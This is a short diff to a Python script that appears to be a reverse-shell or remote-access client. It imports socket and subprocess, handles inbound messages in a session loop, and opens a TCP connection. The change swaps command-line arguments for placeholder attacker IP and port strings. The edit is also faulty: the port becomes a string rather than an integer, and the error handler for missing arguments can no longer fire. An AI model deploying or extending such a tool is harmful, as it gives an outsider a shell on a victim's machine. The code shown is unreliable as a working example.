@@ -1,7 +1,6 @@
 import socket
 import subprocess
 import os
-import sys
 import pwd
 
 #Function to Receive Inbound Messages and Return Them to the Session Handler
@@ -60,8 +59,8 @@ def session_handler():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
-    host_ip=sys.argv[1]
-    host_port=int(sys.argv[2])
+    host_ip='INPUT_IP_HERE'
+    host_port='INPUT_PORT_HERE'
     session_handler()
 except IndexError:
     print('Command line argument(s) missing. Expecting IPv4 Address and Port Number. Please try again.')
